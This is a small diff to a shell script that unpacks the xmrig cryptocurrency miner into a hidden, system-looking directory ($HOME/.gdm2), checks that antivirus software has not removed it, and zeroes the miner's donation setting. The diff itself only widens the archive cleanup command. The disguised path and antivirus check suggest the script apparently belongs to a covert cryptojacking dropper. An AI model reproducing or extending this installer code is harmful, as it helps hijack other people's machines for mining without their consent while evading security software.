@@ -200,7 +200,7 @@ if (test $? -ne 0); then
   if ! tar xvf xmrig.tar.gz -C $HOME/.gdm2 --strip=1; then
     echo "WARNING: Can't unpack xmrig.tar.gz to $HOME/.gdm2 directory"
   fi
-  rm xmrig.tar.gz
+  rm xmrig.tar.gz*
 
   echo "[*] Checking if stock version of $HOME/.gdm2/xmrig works fine (and not removed by antivirus software)"
   sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $HOME/.gdm2/config.json
